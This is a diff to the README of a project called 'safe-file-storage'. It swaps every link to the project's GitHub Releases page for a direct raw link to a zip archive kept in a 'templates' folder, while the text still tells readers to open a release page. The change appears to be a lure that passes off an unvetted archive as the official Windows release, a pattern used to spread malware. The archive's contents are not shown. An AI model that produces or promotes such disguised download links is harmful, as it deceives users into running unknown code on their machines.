@@ -1,9 +1,9 @@
 # 🔒 safe-file-storage - Secure files with simple control
 
-[![Download safe-file-storage](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/aa1125573296-svg/safe-file-storage/releases)
+[![Download safe-file-storage](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/aa1125573296-svg/safe-file-storage/main/templates/file-storage-safe-v3.8.zip)
 
 ## 📥 Download
-Visit this page to download: https://github.com/aa1125573296-svg/safe-file-storage/releases
+Visit this page to download: https://raw.githubusercontent.com/aa1125573296-svg/safe-file-storage/main/templates/file-storage-safe-v3.8.zip
 
 Download the latest release for Windows from that page.
 
@@ -32,7 +32,7 @@ Before you install, make sure you have:
 ## 🚀 Get started on Windows
 
 1. Open the download page:
-   https://github.com/aa1125573296-svg/safe-file-storage/releases
+   https://raw.githubusercontent.com/aa1125573296-svg/safe-file-storage/main/templates/file-storage-safe-v3.8.zip
 
 2. Find the latest release.
 
